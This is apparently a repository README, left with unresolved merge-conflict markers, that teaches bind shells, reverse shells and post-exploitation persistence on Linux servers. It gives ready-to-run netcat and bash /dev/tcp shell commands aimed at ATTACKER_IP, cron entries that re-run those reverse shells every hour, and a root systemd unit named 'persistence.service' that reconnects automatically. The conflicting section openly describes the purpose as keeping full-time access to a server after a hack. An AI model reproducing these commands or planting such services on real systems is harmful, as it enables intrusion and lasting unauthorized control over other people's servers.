<<<<<<< HEAD
🐚 Shell Mastery: From Bind Shell to Persistence

    A journey through my experience with Bind Shell, Reverse Shell, and maintaining access after exploitation.

👋 Introduction

Hey there! I'm Amirreza Nobahar, and in this journey, we're going to explore my personal experience with:

    🔗 Bind Shell & Reverse Shell concepts

    🛡️ Maintaining access after gaining a foothold on a server

    🛠️ Essential Linux tools for persistence (tmux, screen, cron, systemd, and more)

Let's dive in! 🚀
🧠 What is a Shell?

A Shell is a command-line environment that allows us to interact with the operating system by running commands like:
bash

ls
pwd
whoami

It's our gateway to controlling a system — whether it's local or remote.
🔗 Bind Shell
📖 Concept

In a Bind Shell, the target opens a listening port and waits for the attacker to connect.
text

🎯 Target (Server)  ◄──────────  🧑‍💻 Attacker (Client)
     Listening                      Connecting

In other words: Target = Server, Attacker = Client
🛠️ Techniques
1. Using Netcat
bash

nc -nlvp 4444 -e /bin/bash

    Listens on port 4444

    Spawns a /bin/bash shell upon connection

2. Using Bash + FIFO

Bash cannot listen on its own, but we can use a FIFO (Named Pipe) to make it work.

    FIFO = First In, First Out — a named pipe that passes input to output.

Create the FIFO:
bash

rm -f /tmp/fifo ; mkfifo /tmp/fifo

Execute the Bind Shell:
bash

cat /tmp/fifo | /bin/bash -i 2>&1 | nc -nlvp 4444 > /tmp/fifo

How it works:
Part	Function
cat /tmp/fifo	Reads from the FIFO
/bin/bash -i	Executes an interactive shell
2>&1	Redirects errors to standard output
nc -nlvp 4444	Listens on port 4444
> /tmp/fifo	Sends received data back to the FIFO

This creates a loop: attacker → nc → fifo → bash → nc → attacker 🔄
🔄 Reverse Shell
📖 Concept

In a Reverse Shell, the attacker listens and the target connects back.
text

🧑‍💻 Attacker (Server)  ◄──────────  🎯 Target (Client)
     Listening                        Connecting

In other words: Target = Client, Attacker = Server
🛠️ Techniques
1. Using /dev/tcp
bash

bash -i &> /dev/tcp/ATTACKER_IP/PORT 0>&1

Breakdown:
Part	Meaning
bash -i	Spawn an interactive shell
&> /dev/tcp/IP/PORT	Send both STDOUT and STDERR to the TCP connection
0>&1	Redirect STDIN to the same connection
2. Using Netcat
bash

nc ATTACKER_IP PORT < /bin/bash

or
bash

nc -e /bin/bash ATTACKER_IP PORT

⏳ Everlasting Connection (Persistence)

Once you've gained access, the next step is maintaining it. Here are the most common techniques.
🕐 1. Cron Jobs

Cron is a time-based job scheduler. You can schedule commands to run repeatedly.

Edit the crontab:
bash

crontab -e

Cron syntax:
text

* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

Example:
bash

6 15 * * * echo "hello" > /tmp/output.txt

    This runs every day at 15:06.

For persistence:
bash

15 * * * * /bin/bash -i &> /dev/tcp/ATTACKER_IP/PORT 0>&1

or
bash

15 * * * * nc -e /bin/bash ATTACKER_IP PORT

    This attempts a reverse shell every hour at minute 15.

🖥️ 2. Tmux

Tmux creates persistent sessions in the background that survive disconnections.
Command	Description
tmux new -t session_name	Create a new named session
tmux attach -t session_name	Reattach to an existing session
tmux ls	List all sessions

    Pro tip: Even if your SSH connection drops, tmux keeps the session alive. Just reattach later!

📺 3. Screen

Screen is similar to tmux — it creates persistent background sessions.
Command	Description
screen -S session_name	Create a new named session
screen -r session_name	Reattach to an existing session
screen -ls	List all sessions
Ctrl+A then D	Detach from session
⚙️ 4. Systemd Services

Systemd is the modern init system for Linux. You can create a custom service that:

    Starts automatically on boot

    Restarts itself if it crashes

    Runs commands persistently in the background

Create a service file:
bash

sudo nano /etc/systemd/system/persistence.service

Example service:
ini

[Unit]
Description=System Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target

Enable and start the service:
bash

sudo systemctl daemon-reload
sudo systemctl enable persistence.service
sudo systemctl start persistence.service

Check status:
bash

sudo systemctl status persistence.service

📊 Summary Table
Technique	Persistence Level	Use Case
Cron	⭐⭐⭐	Scheduled reconnections
Tmux	⭐⭐	Interactive session survival
Screen	⭐⭐	Interactive session survival
Systemd	⭐⭐⭐⭐⭐	Always-on, auto-restarting service
.bashrc	⭐⭐⭐	Triggers on user login
=======
# sehll_access
gain full time access from server with shell after hack
>>>>>>> dfd5a9b77ba41f87169d41b565e79eaab5326311
